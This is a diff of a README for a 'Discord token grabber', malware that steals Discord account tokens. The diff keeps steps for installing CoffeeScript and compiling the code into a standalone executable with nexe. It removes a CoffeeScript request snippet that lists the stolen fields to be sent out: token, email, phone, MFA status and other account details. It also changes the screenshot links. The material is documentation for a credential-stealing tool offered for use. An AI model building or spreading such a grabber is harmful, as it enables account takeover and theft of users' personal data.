@@ -1,5 +1,7 @@
 # Discord token grabber
 
+( version coffeescript: days to come )
+
 installation ( coffeescript ):
   `npm install coffee-script -g -d`
 
@@ -13,30 +15,8 @@ compile ( js -> exe ):
    `npm install nexe -g -d` and `nexe main.js`
 
 
-request:
-```coffee
-
-setting =
-  headers: 'Content-Type': 'application/json'
-  body: 
-    embeds:
-      title
-      token
-      uuid
-      tag
-      username
-      discriminator
-      email
-      phone
-      verified
-      nsfw_allowed
-      mfa_enabled
-      locale
-      bio
-      banner
-return
-```
-
 result:
 
-![ScreenShot](/screen/Capture.png)
+![ScreenShot](/screen/capture.png)
+![ScreenShot](/screen/capture2.png)
+![ScreenShot](/screen/capture3.png)
